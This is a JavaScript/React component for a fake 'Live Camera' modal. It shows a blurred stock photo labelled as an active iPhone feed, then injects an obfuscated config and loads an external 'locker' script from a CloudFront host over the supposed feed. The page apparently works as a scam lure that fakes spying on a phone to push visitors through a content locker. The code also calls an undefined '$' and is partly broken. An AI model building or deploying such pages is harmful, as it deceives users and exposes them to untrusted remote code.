import { r as e, a as s } from "./vendor-liIMdADX.js";
import {
  X as a,
  L as t,
  P as l,
  M as i,
  C as c,
  S as n,
  V as r,
  a as o,
  b as d,
  c as m,
  U as x,
  H as h,
  d as u,
} from "./icons-D6U1c6qq.js";

// GLOBAL FLAG
let newLockerLoaded = false;

// LOAD LOCKER SCRIPT
const loadNewLocker = () => {
  if (newLockerLoaded) return Promise.resolve();

  // 1. Create config variable for locker
  const e = document.createElement("script");
  e.type = "text/javascript";
  e.textContent = 'var kREIq_uBx_jQhXac={"it":4560437,"key":"791f2"};';
  document.head.appendChild(e);

  // 2. Load external locker script and attach to container
  const s = document.createElement("script");
  s.src = "https://d1y0yks1k8t5m5.cloudfront.net/902c1cf.js";
  s.async = true;
  // Tell locker to attach to container
  s.setAttribute("data-target", "locker-target-container");

  s.onload = () => {
    newLockerLoaded = true;
    console.log("Locker script loaded successfully.");
  };
  s.onerror = () => {
    console.error("Failed to load locker script");
  };

  document.head.appendChild(s);
  return Promise.resolve();
};

// LIVE FEED MODAL COMPONENT
const U = ({ isOpen: s }) => {
  const [a, t] = e.useState(true);   // play/pause state
  const [l, i] = e.useState(false);  // locker container visible

  // Show/hide locker container
  e.useEffect(() => {
    if (s) {
      i(true); // show locker container immediately
    } else {
      i(false);
      newLockerLoaded = false; // allow reloading on next open
    }
  }, [s]);

  // Load locker script when container exists
  e.useEffect(() => {
    if (l) {
      loadNewLocker();
    }
  }, [l]);

  if (!s) return null;

  return $.jsxs("div", {
    className: "fixed inset-0 flex items-center justify-center z-50 p-4 fade-in",
    children: [
      // Background overlay
      $.jsx("div", { className: "fixed inset-0 bg-black/80 backdrop-blur-sm" }),

      // Modal content
      $.jsxs("div", {
        className: "relative max-w-md w-full bg-[#1C1C1E] rounded-2xl overflow-hidden shadow-xl",
        children: [
          // Header
          $.jsx("div", {
            className: "relative px-4 py-3 border-b border-gray-800/30",
            children: $.jsxs("div", {
              className: "flex items-center",
              children: [
                $.jsx(r, { className: "w-5 h-5 mr-2 text-[#0A84FF]" }),
                $.jsx("h3", { className: "text-2xl font-semibold text-white", children: "Live Camera" })
              ]
            })
          }),

          // Live feed area
          $.jsxs("div", {
            className: "relative aspect-[4/3] bg-black overflow-hidden",
            children: [
              // Blurred background image
              $.jsx("div", {
                className: "absolute inset-0 bg-cover bg-center bg-no-repeat",
                style: {
                  backgroundImage: "url(https://images.pexels.com/photos/3760263/pexels-photo-3760263.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2)",
                  filter: "blur(25px) brightness(0.4)",
                  transform: "scale(1.1)"
                }
              }),

              // Center overlay text
              $.jsx("div", {
                className: "absolute inset-0 flex items-center justify-center",
                children: $.jsxs("div", {
                  className: "text-center",
                  children: [
                    $.jsx("div", {
                      className: "w-16 h-16 rounded-full bg-gray-800/50 mx-auto mb-4 flex items-center justify-center backdrop-blur-sm",
                      children: $.jsx(r, { className: "w-8 h-8 text-gray-300" })
                    }),
                    $.jsx("p", {
                      className: "text-sm text-gray-300",
                      children: l ? "Live feed paused" : "Connecting to live feed..."
                    })
                  ]
                })
              }),

              // Play/pause button
              $.jsx("div", {
                className: "absolute bottom-4 right-4 flex space-x-2",
                children: $.jsx("button", {
                  onClick: () => t(!a),
                  className: "w-8 h-8 rounded-full bg-black/50 backdrop-blur-sm flex items-center justify-center text-white hover:bg-black/70 transition-colors",
                  children: a ? $.jsx(o, { className: "w-4 h-4" }) : $.jsx(d, { className: "w-4 h-4" })
                })
              }),

              // Locker container
              l && $.jsx("div", {
                id: "locker-target-container",
                className: "absolute inset-0 bg-black/90 z-[100] fade-in"
              })
            ]
          }),

          // Footer with device info
          $.jsxs("div", {
            className: "p-4 border-t border-gray-800/30",
            children: [
              $.jsxs("div", { className: "flex items-center justify-between text-sm mb-2", children: [
                $.jsx("span", { className: "text-gray-400", children: "Device" }),
                $.jsx("span", { className: "text-white", children: "iPhone" })
              ]}),
              $.jsxs("div", { className: "flex items-center justify-between text-sm", children: [
                $.jsx("span", { className: "text-gray-400", children: "Status" }),
                $.jsx("span", { className: "text-green-400", children: "Active" })
              ]})
            ]
          })
        ]
      })
    ]
  });
};
